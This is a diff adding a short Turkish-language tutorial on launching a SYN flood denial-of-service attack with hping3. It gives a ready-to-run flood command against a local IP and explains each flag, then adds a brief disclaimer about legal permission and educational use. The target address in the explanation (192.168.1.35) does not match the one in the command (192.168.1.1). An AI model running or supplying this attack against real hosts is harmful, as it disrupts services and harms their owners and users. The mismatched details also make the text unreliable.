@@ -1,0 +1,18 @@
+hping3, Kali Linux'ta varsayılan olarak yüklü gelen bir araçtır. 
+SYN flood saldırısı yapmak için hping3'ü kullanacağız. 
+Aşağıdaki komutla SYN paketleri göndererek saldırıyı başlatabilirsiniz:
+
+hping3 -c 10000 -d 120 -S -w 64 -p 80 --flood 192.168.1.1
+
+    -c 10000: 10000 SYN paketi gönderilecek.
+    -d 120: Gönderilecek SYN paketlerinin veri boyutu 120 byte olacak.
+    -S: SYN flag'ini belirtir, böylece hedef sunucuya SYN talepleri gönderilir.
+    -w 64: çerçeve boyutunu belirler.
+    -p 80: Hedef portu belirler, burada 80 numaralı HTTP portu seçilmiştir.
+    --flood: Sürekli olarak SYN paketleri gönderir, durmaksızın saldırı gerçekleştirir.
+    192.168.1.35: Hedef sunucunun IP adresidir, bu örnekte yerel ağdaki bir sunucu olarak kabul edilmiştir.
+
+
+Bu adımları takip ederek, hping3 kullanarak yerel ağınızdaki bir sunucuya SYN flood saldırısı gerçekleştirebilirsiniz. 
+Ancak, bu tür saldırıların yasal sonuçları olabileceğini ve etik sınırların aşılmasını engellemek için yasal izinler almanız 
+gerektiğini unutmayın. Ayrıca, sadece eğitim amaçlı ve izinli olarak gerçekleştirilmelidir.
